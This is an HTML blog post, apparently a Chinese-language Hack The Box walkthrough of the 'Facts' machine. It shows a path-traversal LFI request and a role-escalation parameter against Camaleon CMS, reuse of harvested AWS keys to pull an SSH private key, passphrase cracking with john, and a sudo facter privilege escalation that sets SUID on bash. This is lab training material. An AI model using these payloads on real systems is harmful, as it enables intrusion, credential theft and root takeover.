@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="UxddIxMQ3ffOR4pmQs1CNIEG7S_qmKRsumruyIbgsGQ">
+  <meta name="msvalidate.01" content="A35AD8AE43092D6BAF78D36FAC56B4DD">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"ry0ma24.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.27.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark","theme":"prism-tomorrow.css"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content=".lyekchgdvjzo{zoom:50%;}">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Facts">
+<meta property="og:url" content="https://ry0ma24.github.io/posts/a66eeeb7.html">
+<meta property="og:site_name" content="相忘于江湖">
+<meta property="og:description" content=".lyekchgdvjzo{zoom:50%;}">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/a66eeeb7/bdcd209c32f156fbfb2268f099971f75.png">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/a66eeeb7/image-20260409135635326.png">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/a66eeeb7/image-20260409135832986.png">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/a66eeeb7/image-20260409140026432.png">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/a66eeeb7/image-20260409141045188.png">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/a66eeeb7/image-20260409140852202.png">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/a66eeeb7/image-20260409141918732.png">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/a66eeeb7/image-20260409142148020.png">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/a66eeeb7/image-20260409142230901.png">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/a66eeeb7/image-20260409142740630.png">
+<meta property="article:published_time" content="2026-04-09T05:49:00.000Z">
+<meta property="article:modified_time" content="2026-04-10T06:47:10.481Z">
+<meta property="article:author" content="Ry0ma24">
+<meta property="article:tag" content="CVE">
+<meta property="article:tag" content="LFI">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ry0ma24.github.io/posts/a66eeeb7/bdcd209c32f156fbfb2268f099971f75.png">
+
+
+<link rel="canonical" href="https://ry0ma24.github.io/posts/a66eeeb7.html">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://ry0ma24.github.io/posts/a66eeeb7.html","path":"posts/a66eeeb7.html","title":"HTB-Facts"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>HTB-Facts | 相忘于江湖</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="相忘于江湖" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">相忘于江湖</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人生天地之间，若白驹之过隙，忽然而已</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap-Scan"><span class="nav-number">1.</span> <span class="nav-text">Nmap Scan</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FFUF-Scan"><span class="nav-number">2.</span> <span class="nav-text">FFUF Scan</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LFI-CVE-2024-46987"><span class="nav-number">4.</span> <span class="nav-text">LFI (CVE-2024-46987 )</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-CVE-CVE-2025-2304"><span class="nav-number">5.</span> <span class="nav-text">权限提升(CVE CVE-2025-2304)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSH-%E7%99%BB%E5%BD%95"><span class="nav-number">6.</span> <span class="nav-text">SSH 登录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">7.</span> <span class="nav-text">权限提升</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ry0ma24"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Ry0ma24</p>
+  <div class="site-description" itemprop="description">好好活动，好好学习，好好游戏，好好吃饭，好好休息，要过一个开心有趣，精神百倍的人生</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">37</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lvdXJuYW1l" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yourname"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOnlvdXJuYW1lQGdtYWlsLmNvbQ==" title="E-Mail → mailto:yourname@gmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ry0ma24.github.io/posts/a66eeeb7.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Ry0ma24">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="相忘于江湖">
+      <meta itemprop="description" content="好好活动，好好学习，好好游戏，好好吃饭，好好休息，要过一个开心有趣，精神百倍的人生">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="HTB-Facts | 相忘于江湖">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HTB-Facts
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-04-09 13:49:00" itemprop="dateCreated datePublished" datetime="2026-04-09T13:49:00+08:00">2026-04-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-04-10 14:47:10" itemprop="dateModified" datetime="2026-04-10T14:47:10+08:00">2026-04-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Hackthebox/" itemprop="url" rel="index"><span itemprop="name">Hackthebox</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><style>.lyekchgdvjzo{zoom:50%;}</style><img src="/posts/a66eeeb7/bdcd209c32f156fbfb2268f099971f75.png" class="lyekchgdvjzo" alt="HTB-facts">
+
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th>OS</th>
+<th>Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Linux</td>
+<td>Easy</td>
+</tr>
+</tbody></table>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.129</span>.16.180 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-Pn</span>     
+Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2026</span>-04-09 <span class="token number">13</span>:42 CST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.129</span>.16.180
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.13s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">997</span> closed tcp ports <span class="token punctuation">(</span>conn-refused<span class="token punctuation">)</span>
+PORT   STATE SERVICE VERSION
+<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">9</span>.9p1 Ubuntu 3ubuntu3.2 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token number">53</span>/tcp <span class="token function">open</span>  domain  Unbound
+<span class="token number">80</span>/tcp <span class="token function">open</span>  http    nginx <span class="token number">1.26</span>.3 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
+Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">27.51</span> seconds</code></pre>
+
+<p>添加本地解析</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.129.16.180 facts.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts </code></pre>
+
+<h3 id="FFUF-Scan"><a href="#FFUF-Scan" class="headerlink" title="FFUF Scan"></a>FFUF Scan</h3><p>枚举目录，发现admin </p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ ffuf <span class="token parameter variable">-w</span> /opt/secLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ <span class="token parameter variable">-u</span> <span class="token string">'http://facts.htb/FUZZ'</span> <span class="token parameter variable">-ic</span> <span class="token parameter variable">-t</span> <span class="token number">100</span> 
+
+        /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>       
+       /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/  __  __  /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/       
+       <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>      
+        <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/      
+         <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>____/  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>       
+          <span class="token punctuation">\</span>/_/    <span class="token punctuation">\</span>/_/   <span class="token punctuation">\</span>/___/    <span class="token punctuation">\</span>/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           <span class="token builtin class-name">:</span> GET
+ :: URL              <span class="token builtin class-name">:</span> http://facts.htb/FUZZ
+ :: Wordlist         <span class="token builtin class-name">:</span> FUZZ: /opt/secLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Follow redirects <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
+ :: Calibration      <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
+ :: Timeout          <span class="token builtin class-name">:</span> <span class="token number">10</span>
+ :: Threads          <span class="token builtin class-name">:</span> <span class="token number">100</span>
+ :: Matcher          <span class="token builtin class-name">:</span> Response status: <span class="token number">200</span>-299,301,302,307,401,403,405,500
+________________________________________________
+
+index                   <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">11113</span>, Words: <span class="token number">1328</span>, Lines: <span class="token number">125</span>, Duration: 422ms<span class="token punctuation">]</span>
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
+admin                   <span class="token punctuation">[</span>Status: <span class="token number">302</span>, Size: <span class="token number">0</span>, Words: <span class="token number">1</span>, Lines: <span class="token number">1</span>, Duration: 4170ms<span class="token punctuation">]</span>
+post                    <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">11308</span>, Words: <span class="token number">1414</span>, Lines: <span class="token number">152</span>, Duration: 7738ms<span class="token punctuation">]</span>
+ajax                    <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">0</span>, Words: <span class="token number">1</span>, Lines: <span class="token number">1</span>, Duration: 4216ms<span class="token punctuation">]</span>
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span></code></pre>
+
+<p>访问admin 发现后台</p>
+<img src="/posts/a66eeeb7/image-20260409135635326.png" class="" title="后台">
+
+<p>注册账号试试，发现可以注册并且登录</p>
+<img src="/posts/a66eeeb7/image-20260409135832986.png" class="" title="注册">
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>登录后台可以找到cms 信息和版本，根据信息检索到 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FmaWZ1ZGlubXRvcC9DYW1hbGVvbi1DTVMtMi45LjAtVnVsbg==">https://github.com/afifudinmtop/Camaleon-CMS-2.9.0-Vuln<i class="fa fa-external-link-alt"></i></span> 有两个CVE CVE-2025-2304和CVE-2024-46987 </p>
+<img src="/posts/a66eeeb7/image-20260409140026432.png" class="" title="image-20260409140026432">
+
+<h3 id="LFI-CVE-2024-46987"><a href="#LFI-CVE-2024-46987" class="headerlink" title="LFI (CVE-2024-46987 )"></a>LFI (CVE-2024-46987 )</h3><p>使用burp 请求 <code>admin/media/download_private_file?file=../../../../../../etc/passwd</code>可以获取到&#x2F;etc&#x2F;passwd，通过LFI可以直接读取flag</p>
+<img src="/posts/a66eeeb7/image-20260409141045188.png" class="" title="LFI">
+
+
+
+<img src="/posts/a66eeeb7/image-20260409140852202.png" class="" title="flag">
+
+
+
+<h3 id="权限提升-CVE-CVE-2025-2304"><a href="#权限提升-CVE-CVE-2025-2304" class="headerlink" title="权限提升(CVE CVE-2025-2304)"></a>权限提升(CVE CVE-2025-2304)</h3><p>点击”Change Password”, 输入新密码，抓包，添加<code>&amp;password[role]=admin</code> ，之后刷新页面，可以看到提升到管理员后台</p>
+<img src="/posts/a66eeeb7/image-20260409141918732.png" class="" title="提权">
+
+
+
+<img src="/posts/a66eeeb7/image-20260409142148020.png" class="" title="提权">
+
+
+
+<img src="/posts/a66eeeb7/image-20260409142230901.png" class="" title="管理员后台">
+
+<p>在后台配置中可以找到AWS 的密钥配置</p>
+<img src="/posts/a66eeeb7/image-20260409142740630.png" class="" title="aws">
+
+<h3 id="SSH-登录"><a href="#SSH-登录" class="headerlink" title="SSH 登录"></a>SSH 登录</h3><p>安装aws   <code>curl &quot;https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip&quot; -o &quot;awscliv2.zip&quot;</code>   </p>
+<p>配置aws 并连接，在.ssh 目录下可以获取到 id_ed25519</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ aws configure                                                             
+
+Tip: You can deliver temporary credentials to the AWS CLI using your AWS Console session by running the <span class="token builtin class-name">command</span> <span class="token string">'aws login'</span><span class="token builtin class-name">.</span>
+
+AWS Access Key ID <span class="token punctuation">[</span>None<span class="token punctuation">]</span>: AKIA9<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>FAD15D5
+AWS Secret Access Key <span class="token punctuation">[</span>None<span class="token punctuation">]</span>: ZrwidjEG<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>y5v1gCextPZRLWU
+Default region name <span class="token punctuation">[</span>None<span class="token punctuation">]</span>: us-east-1
+Default output <span class="token function">format</span> <span class="token punctuation">[</span>None<span class="token punctuation">]</span>: 
+
+$ aws s3 <span class="token function">ls</span> --endpoint-url http://facts.htb:54321                          
+<span class="token number">2025</span>-09-11 <span class="token number">20</span>:06:52 internal
+<span class="token number">2025</span>-09-11 <span class="token number">20</span>:06:52 randomfacts
+
+$ aws s3 <span class="token function">ls</span> s3://internal/ --endpoint-url http://facts.htb:54321  
+                           PRE .bundle/
+                           PRE .cache/
+                           PRE .ssh/
+<span class="token number">2026</span>-01-09 02:45:13        <span class="token number">220</span> .bash_logout
+<span class="token number">2026</span>-01-09 02:45:13       <span class="token number">3900</span> .bashrc
+<span class="token number">2026</span>-01-09 02:47:17         <span class="token number">20</span> .lesshst
+<span class="token number">2026</span>-01-09 02:47:17        <span class="token number">807</span> .profile
+
+$ aws s3 <span class="token function">ls</span> s3://internal/.ssh/ --endpoint-url http://facts.htb:54321  
+<span class="token number">2026</span>-04-09 <span class="token number">13</span>:40:07         <span class="token number">82</span> authorized_keys
+<span class="token number">2026</span>-04-09 <span class="token number">13</span>:40:07        <span class="token number">464</span> id_ed25519
+
+$ aws s3 <span class="token function">cp</span> s3://internal/.ssh/id_ed25519 --endpoint-url http://facts.htb:54321 ./id_ed25519 
+download: s3://internal/.ssh/id_ed25519 to ./id_ed25519             
+</code></pre>
+
+<p>使用john 破解id_ed25519 并使用trivia 账号登录成功，trivia账号在&#x2F;etc&#x2F;passwd 文件中获取</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$python3</span> ssh2john.py id_ed25519 ssh.hash
+
+$./john <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/opt/secLists/rockyou.txt ssh.hash 
+Using default input encoding: UTF-8
+Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>SSH, SSH private key <span class="token punctuation">[</span>MD5/bcrypt-pbkdf/<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>DES/AES <span class="token number">32</span>/64<span class="token punctuation">]</span><span class="token punctuation">)</span>
+Cost <span class="token number">1</span> <span class="token punctuation">(</span>KDF/cipher <span class="token punctuation">[</span><span class="token number">0</span>:MD5/AES <span class="token number">1</span>:MD5/<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>DES <span class="token number">2</span>:bcrypt-pbkdf/AES<span class="token punctuation">]</span><span class="token punctuation">)</span> is <span class="token number">2</span> <span class="token keyword">for</span> all loaded hashes
+Cost <span class="token number">2</span> <span class="token punctuation">(</span>iteration count<span class="token punctuation">)</span> is <span class="token number">24</span> <span class="token keyword">for</span> all loaded hashes
+Will run <span class="token number">16</span> OpenMP threads
+Press <span class="token string">'q'</span> or Ctrl-C to abort, <span class="token string">'h'</span> <span class="token keyword">for</span> help, almost any other key <span class="token keyword">for</span> status
+dragonballz      <span class="token punctuation">(</span>id_ed25519<span class="token punctuation">)</span>     
+1g <span class="token number">0</span>:00:00:30 DONE <span class="token punctuation">(</span><span class="token number">2026</span>-04-09 <span class="token number">15</span>:22<span class="token punctuation">)</span> <span class="token number">0</span>.03327g/s <span class="token number">106</span>.5p/s <span class="token number">106</span>.5c/s <span class="token number">106</span>.5C/s adriano<span class="token punctuation">..</span>imissu
+Use the <span class="token string">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+
+$ <span class="token function">chmod</span> <span class="token number">600</span> id_ed25519                                                                                      
+$ <span class="token function">ssh</span> <span class="token parameter variable">-i</span> id_ed25519 trivia@facts.htb 
+Enter passphrase <span class="token keyword">for</span> key <span class="token string">'id_ed25519'</span><span class="token builtin class-name">:</span> </code></pre>
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>sudo -l 发现facter，通过检索 <span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5vcmcvZ3Rmb2JpbnMvZmFjdGVyLw==">https://gtfobins.org/gtfobins/facter/<i class="fa fa-external-link-alt"></i></span> 发现目录底下第一个ruby 文件会被执行</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">trivia@facts:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+Matching Defaults entries <span class="token keyword">for</span> trivia on facts:
+    env_reset, mail_badpass,
+    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin, use_pty
+
+User trivia may run the following commands on facts:
+    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: /usr/bin/facter
+
+trivia@facts:~$ /usr/bin/facter <span class="token parameter variable">-h</span>
+Usage
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+  facter <span class="token punctuation">[</span>options<span class="token punctuation">]</span> <span class="token punctuation">[</span>query<span class="token punctuation">]</span> <span class="token punctuation">[</span>query<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
+
+Options
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+           <span class="token punctuation">[</span>--color<span class="token punctuation">]</span>                      Enable color output.
+           <span class="token punctuation">[</span>--no-color<span class="token punctuation">]</span>                   Disable color output.
+        <span class="token parameter variable">-c</span> <span class="token punctuation">[</span>--config<span class="token punctuation">]</span>                     The location of the config file.
+           <span class="token punctuation">[</span>--custom-dir<span class="token punctuation">]</span>                 A directory to use <span class="token keyword">for</span> custom facts.
+        <span class="token parameter variable">-d</span> <span class="token punctuation">[</span>--debug<span class="token punctuation">]</span>                      Enable debug output.
+           <span class="token punctuation">[</span>--external-dir<span class="token punctuation">]</span>               A directory to use <span class="token keyword">for</span> external facts.
+           <span class="token punctuation">[</span>--hocon<span class="token punctuation">]</span>                      Output <span class="token keyword">in</span> Hocon format.
+      <span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
+        <span class="token parameter variable">-h</span> <span class="token punctuation">[</span>--help<span class="token punctuation">]</span>                       Help <span class="token keyword">for</span> all arguments
+
+trivia@facts:~$  <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /tmp/exploit
+trivia@facts:~$  <span class="token builtin class-name">cd</span> /tmp/exploit/
+trivia@facts:/tmp/exploit$ <span class="token function">cat</span> <span class="token operator">></span> /tmp/exploit_facts/exp.rb <span class="token operator">&lt;&lt;</span> <span class="token string">'EOF'
+#!/usr/bin/env ruby
+system("chmod +s /bin/bash")
+EOF</span>
